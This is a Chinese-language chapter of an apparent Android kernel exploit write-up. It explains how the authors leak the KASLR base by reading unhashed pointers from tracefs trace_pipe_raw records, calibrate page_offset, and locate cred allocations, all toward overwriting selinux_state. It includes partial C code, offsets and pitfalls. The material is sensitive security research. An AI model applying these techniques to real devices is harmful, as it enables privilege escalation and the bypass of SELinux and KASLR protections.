# 05 · KASLR 泄露

> 要写内核内存，第一件事是知道内核在哪。这一章讲我们怎么在**完全不触发漏洞**的前提下
> 拿到 KASLR base，以及踩过的三个坑。

---

## 一、为什么 KASLR 是第一个门槛

我们需要写 `selinux_state`，它的**链接地址**是 `0xffffffc08236a2e0`，
但**运行时地址** = 链接地址 + slide。

slide 每次开机都变，而且：

```
我们的实测值：slide = 0x2b45280000
              slide & 0x1fffff = 0x80000     ← 只有 512KB 对齐，不是 2MiB！
```

**这个「不是 2MiB 对齐」的事实后来成了整个项目的关键线索（见 09 章）。**

---

## 二、可用和不可用的泄露渠道

| 渠道 | 可用性 | 说明 |
|---|---|---|
| `/proc/kallsyms` | ❌ | `kptr_restrict` 高，shell 读出来全是 0 |
| `dmesg` | ❌ | `dmesg_restrict` |
| `perf_event_open` | ❌ Enforcing | 需要 Permissive |
| **tracefs raw 记录** | ✅ **可用** | shell 在 `readtracefs` 组 |
| `debugfs` | ❌ | 未挂载 |

**关键：`/sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw` 是 0640，
shell 在 `readtracefs` 组，可以读。而它的二进制记录里是未 hash 的真实指针。**

---

## 三、方法：`sched_blocked_reason` 的 caller 字段

### 3.1 原理

`get_wchan(task)` 会返回任务在内核里阻塞的位置 —— 那是一个**内核代码地址**。

而 `sched/sched_blocked_reason` tracepoint 会把这个值记录进 raw 记录。

### 3.2 记录布局

我们实测确认：

```
event ID = 109
raw 偏移 16 = void* caller      ← get_wchan(task)
```

### 3.3 实现

```c
/* 简化的核心逻辑，完整代码见 tools/kaslr_leak.c */

/* 1) 打开全部 CPU 的 trace_pipe_raw */
for (int cpu = 0; cpu < nr_cpu; cpu++) {
    snprintf(path, sizeof(path),
             "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
    fd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
}

/* 2) 制造一个阻塞在内核里的任务 */
/*    （比如让一个线程去 futex 等待，它就会阻塞在某个已知函数里）*/

/* 3) 从 raw 记录里读 caller */
uint64_t caller;
memcpy(&caller, raw + 16, 8);

/* 4) 候选 base = caller - 已知符号的偏移 */
```

### 3.4 校准表

我们预先做了一张「返回地址 → 所属函数」的对照表，验证了 8/8 全部落在正确函数体内。

然后用**投票**取最多的那个候选：

```
KASLR base=0xffffffd428480000（5 票）
```

票数 ≥ 3 就接受。

### 3.5 重试

单次采样可能失败（任务没阻塞 / trace 没开 / buffer 满），所以：

```c
for (int attempt = 0; attempt < 6; attempt++) {
    /* ... 采样 + 投票 ... */
    if (votes >= 3) break;
    usleep(20000);
}
```

**6 次重试后成功率接近 100%。**

---

## 四、第二个校准：`page_offset`（线性映射基址）

拿到 KASLR 只能定位**代码和数据段的符号**。
但我们需要知道「物理页号 ↔ 内核虚拟地址」的换算，那需要 `page_offset`。

### 方法

```
page_offset = PAGE_OFFSET_CONST - memstart_addr
```

其中：

- `PAGE_OFFSET_CONST` 对 39-bit VA 是 `0xffffff8000000000`
- `memstart_addr` 是 DRAM 起始物理地址

### 从 `/proc/zoneinfo` 读

```console
$ adb shell cat /proc/zoneinfo | head
Node 0, zone   Normal
  start_pfn:    ...
```

```
memstart_addr = start_pfn * 4096
```

### 交叉验证：用 trace 里「物理页号 + 对象虚拟地址」配对

`kmem:mm_page_alloc` tracepoint 会给出 `pfn`。
`kmem:kmem_cache_alloc` 会给出对象的**内核虚拟地址**。

如果同一个 slab 页既出现在 page_alloc（带 pfn）又出现在 cache_alloc（带 ptr），
那么：

```
ptr - (pfn << 12) = page_offset
```

**Shark 的 `calibrate_base()` 就是这么做的，而且要求结果 2MiB 对齐：**

```c
if ((base & 0x1fffffULL) || base < 0xffffff0000000000ULL ||
    base >= 0xffffffc000000000ULL)
    continue;
```

我们实测得到的 `best = 0xffffff7fc0000000`（不是标准的 `0xffffff7f80000000`，
说明这颗 SoC 的 DRAM 起始 PFN 和参考值不同 —— 所以**必须实测，不能照抄**）。

---

## 五、★ 三个必须记住的坑

### 坑 1：`PERF_SAMPLE_TID` 在 per-CPU 事件里是 -1

我们一开始用 `tid == mytid` 过滤样本，结果**一条都拿不到**。

**原因**：per-CPU 的 perf 事件采到的记录里，`sample.tid` 是 `-1`。

**修法**：去掉这个过滤条件，改用 `bytes_req` / `call_site` 来区分。

### 坑 2：`bytes_req` 是 184，不是 192

找 cred 分配的时候，我们一开始以为 `bytes_req == 192`（`cred_jar` 的 `size`）。
结果一条也抓不到。

**实际**：tracepoint 报的 `bytes_req` 是 **`s->object_size` = 184**，
而 `bytes_alloc` 才是 `s->size` = 192。

```
kmem_cache_alloc: call_site=prepare_creds+0x24/0x2fc
                  ptr=... bytes_req=184 bytes_alloc=192
```

**判据**：
- `bytes_req == 184`（`sizeof(struct cred)`）
- `(ptr % 4096) % 192 == 0`（`cred_jar` 几何：21 对象/页）

### 坑 3：ring buffer 会溢出，必须频繁排空

我们的第一条实现，1.6 秒只采到 **60 条**记录，完全不够。

**原因**：perf ring 没及时读，数据被覆盖了。

**修法**：改成**每 20 ms 排空一次**：

```c
while (1) {
    drain_all_rings();
    if (collected >= want) break;
    usleep(20000);
}
```

**同样时间，采到 13861 条 —— 230 倍的差距。**

**这就是我们之前「一直采不到样本」的真正原因。**

---

## 六、KASLR 相关的额外发现

### `kptr_restrict` 只影响文本输出

```console
$ adb shell grep kmem_cache_alloc /sys/kernel/tracing/trace | head -2
sh-17367 [007] .... 3451.640059: kmem_cache_alloc:
    call_site=copy_process+0x140/0x1030
    ptr=00000000f13ff2d1                ← 文本里是 hash 过的
    bytes_req=4800 bytes_alloc=4800
```

**但 `trace_pipe_raw` 里的二进制记录是未 hash 的真实指针。**

所以：**用文本 `trace` 调试，用 `trace_pipe_raw` 拿真地址。**

### 验证符号偏移

```console
$ python tools/kcalls.py copy_process | grep kmem_cache_alloc
  0xffffffc0800ab938  bl -> kmem_cache_alloc_node+0x0
```

**返回地址（`_RET_IP_`）= 0xffffffc0800ab93c**，低 21 位 = `0xab93c`。

**和 Shark profile 里的 `copy_low21 = 0xab93c` 完全一致。**
（但这个值**不能直接用于运行时比较** —— 见 [09 章](09-root-cause.md)。）
